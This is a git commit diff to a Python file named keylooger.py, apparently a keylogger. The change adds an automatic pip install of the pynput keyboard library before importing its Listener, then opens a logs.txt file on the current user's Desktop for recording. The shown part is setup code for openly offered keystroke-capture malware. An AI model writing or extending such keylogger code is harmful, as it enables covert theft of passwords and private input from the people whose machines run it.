0bad3d6a4120c2492bc010e6aa4996d4b8b00543
Ajay Navaneethan <nrajay006@gmail.com>
2022-10-06 16:49:10 +0100

    added code for missing module error pynput

--- keylooger.py
+++ keylooger.py
@@ -1,8 +1,15 @@
-from pynput.keyboard import Listener
 import os
+import sys
+import subprocess
 import logging
 from shutil import copyfile
+import time 
 
+#installing requied module
+subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pynput'])
+time.sleep(2)
+
+from pynput.keyboard import Listener
 username = os.getlogin()
 logging_directory = f"C:/Users/{username}/OneDrive/Desktop"
 file = open(f"C:/Users/{username}/OneDrive/Desktop/logs.txt","w")
